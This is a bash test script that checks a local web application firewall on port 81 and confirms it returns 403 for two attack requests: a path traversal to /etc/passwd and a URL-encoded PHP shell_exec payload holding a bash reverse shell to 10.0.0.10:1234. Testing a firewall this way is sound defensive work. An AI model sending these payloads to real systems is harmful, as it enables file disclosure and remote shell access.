#/bin/bash
echo "[+] - Checking if our WAF is up."
for I in 1 2 3 4 5
do
	http_code=$(curl "http://localhost:81/SomeFile.php?SomeParam=HelloWorld" -s -f -w %{http_code} -o /dev/null)
	if (($http_code == 404)); then 
		echo "[+] - We got a $http_code. This is correct since we dont host any files. Our WAF is up!"; 
		break
  	fi
	echo "[!] - We got a $http_code. Our WAF seems to be down. Check $I out of 5"; 
	sleep 10s
	if (($I == 5)); then
		echo "[!] - Check counter $I out of 5. Killing test."; 		
		exit 200; 
	fi	
done

echo "[+] - Checking Path Traversal"
path_traversal_http_code=$(curl "http://localhost:81/SomeFile.php?SomeParam=../../../etc/passwd" -s -f -w %{http_code} -o /dev/null)
if (($path_traversal_http_code == 403)); then 
	echo "[+] - We got a $path_traversal_http_code on Path Traversal. Our WAF blocked the reqeust, Noice!"; 
else 
	echo "[!] - We got a $path_traversal_http_code on Path Traversal. Our WAF did NOT block the request :("; 
	exit 201; 
fi

echo "[+] - Checking Shell Exec"
shell_exec_http_code=$(curl "http://localhost:81/SomeFile.php?SomeParam=shell_exec%28%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.10%2F1234%200%3E%261%27%22%29" -s -f -w %{http_code} -o /dev/null)
if (($shell_exec_http_code == 403)); then 
	echo "[+] - We got a $shell_exec_http_code on Shell Exec. Our WAF blocked the reqeust, Noice!"; 
else 
	echo "[!] - We got a $shell_exec_http_code on Shell Exec. Our WAF did NOT block the request :("; 
	exit 202; 
fi
echo "[+] - All tests succeded !"